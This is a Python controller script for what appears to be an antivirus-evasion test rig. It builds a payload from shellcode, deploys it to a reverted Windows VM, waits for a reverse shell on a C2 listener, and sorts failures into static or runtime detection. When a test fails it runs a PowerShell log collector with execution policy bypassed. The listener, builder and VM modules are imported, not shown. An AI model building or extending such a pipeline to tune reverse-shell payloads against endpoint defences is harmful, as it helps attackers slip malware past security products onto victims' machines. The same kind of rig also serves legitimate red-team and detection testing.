import threading
import time
import os
import logging
from controller.config import *
from controller.modules.builder import PayloadBuilder
from controller.modules.vm_manager import KVMManager
from controller.modules.c2 import C2Listener

# Setup Logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] - %(message)s')

def build_payload(shellcode_path, build_options):
    builder = PayloadBuilder(shellcode_path, build_options)
    return builder.build()

def run_single_test(vm_name, payload_path, build_options):
    # 1. Setup Infrastructure
    vm_conf = VMS_CONFIG.get(vm_name)
    if not vm_conf: return {"status": "ERROR", "log": "VM Config Not Found"}

    vm = KVMManager(vm_conf['domain'], vm_conf['guest_ip'])
    c2 = C2Listener(LISTENER_IP, LISTENER_PORT)

    logging.info(f"=== Starting Test Cycle on {vm_name} ===")

    # 2. Prepare Environment
    if not vm.revert_snapshot(CLEAN_SNAPSHOT_NAME): return {"status": "FAILED", "log": "Revert Failed"}
    if not vm.start(): return {"status": "FAILED", "log": "Start Failed"}
    if not vm.wait_for_guest():
        vm.stop()
        return {"status": "FAILED", "log": "Guest SSH Timeout"}

    # 3. Connection Test (Diagnostic)
    collector_script = vm_conf['log_collector_host']
    if not vm.copy_to_guest(collector_script, GUEST_LOG_COLLECTOR):
        vm.stop()
        return {"status": "FAILED", "log": "Connection Test Failed (Copy Collector)"}

    # 4. Deploy Payload (Stage 1 Check)
    payload_deployed = vm.copy_to_guest(payload_path, GUEST_PAYLOAD_PATH)

    execution_triggered = False
    if payload_deployed:
        # 5. Execute & Listen (Stage 4 Check)
        t = threading.Thread(target=c2.listen, args=(30,)) # Listen for 30s
        t.start()
        time.sleep(2)

        execution_triggered = vm.run_program(GUEST_PAYLOAD_PATH, no_wait=True)
        t.join()

    # 6. Analyze Results
    status = "UNKNOWN"
    log_data = "N/A"

    if c2.success:
        status = "SUCCESS"
        log_data = "Reverse Shell Established!"
    else:
        if not payload_deployed:
            status = "FAILED (Transfer Blocked)"
            log_data = "Payload deleted/blocked during copy (Static Defense)."
        elif not execution_triggered:
            status = "FAILED (Static Detection)"
            log_data = "Payload copied but deleted before execution."
        else:
            status = "FAILED (Runtime Detection)"
            log_data = "Payload executed but blocked by behavior."

        # Collect Logs
        logging.info(f"Test Failed: {status}. Collecting Artifacts...")
        vm.run_program(
            r"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe",
            f"-ExecutionPolicy Bypass -File {GUEST_LOG_COLLECTOR}"
        )
        time.sleep(5)

        # Retrieve log file
        host_log_path = os.path.join(PROJECT_ROOT, "test_logs", f"{vm_name}_{int(time.time())}.txt")
        if vm.copy_from_guest(GUEST_LOG_OUTPUT, host_log_path):
            try:
                with open(host_log_path, 'r', encoding='utf-8') as f:
                    log_data += "\n\n=== GUEST LOGS ===\n" + f.read()
            except: pass

    # 7. Cleanup
    vm.stop()
    return {"status": status, "log": log_data}
